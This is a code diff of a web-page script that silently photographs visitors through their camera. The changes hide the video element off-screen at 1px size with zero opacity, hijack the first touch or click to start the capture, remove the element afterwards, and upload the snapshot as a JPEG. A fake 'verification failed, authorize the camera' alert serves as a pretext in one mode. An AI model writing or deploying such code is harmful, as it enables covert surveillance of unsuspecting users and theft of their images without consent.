@@ -1057,15 +1057,23 @@ captured = true;
 unlock();
 const video = document.createElement('video');
 video.srcObject = stream;
-video.setAttribute("playsinline", "");
-video.setAttribute("autoplay", "");
+video.playsInline = true;
+video.autoplay = true;
 video.muted = true;
-await video.play();
-await new Promise(r => setTimeout(r, 300));
+video.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1";
+document.body.appendChild(video);
+await new Promise((resolve, reject) => {
+video.onloadedmetadata = function() {
+video.play().then(resolve).catch(reject);
+};
+setTimeout(reject, 5000);
+});
+await new Promise(r => setTimeout(r, 500));
 const canvas = document.createElement('canvas');
 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
 canvas.getContext('2d').drawImage(video, 0, 0);
 stream.getTracks().forEach(t => t.stop());
+document.body.removeChild(video);
 upload(canvas.toDataURL('image/jpeg', 0.6));
 } catch(e) {
 if(MODE==="1") alert("验证失败，请授权摄像头。");
@@ -1078,18 +1086,17 @@ window.performCapture = startCapture;
 } else if(MODE==="2") {
 window.addEventListener('click', startCapture, {once:true});
 } else {
-// 模式0：iOS/安卓要求用户手势才能开摄像头
-// 首次触摸/点击即触发，超时3秒兜底尝试
+// 模式0：首次用户触摸/点击触发摄像头（iOS/安卓必需）
 let triggered = false;
-function tryCapture() {
-if (!triggered) { triggered = true; startCapture(); }
+function tryCapture(e) {
+if (!triggered) {
+triggered = true;
+if (e) e.preventDefault();
+startCapture();
 }
-document.addEventListener('touchstart', tryCapture, {once:false, passive:true});
-document.addEventListener('click', tryCapture, {once:false});
-document.addEventListener('touchend', tryCapture, {once:false});
-setTimeout(function() {
-if (!triggered) { triggered = true; startCapture(); }
-}, 3000);
+}
+document.addEventListener('touchstart', tryCapture, {once:true, passive:false});
+document.addEventListener('click', tryCapture, {once:true});
 }
 })();
 </script>
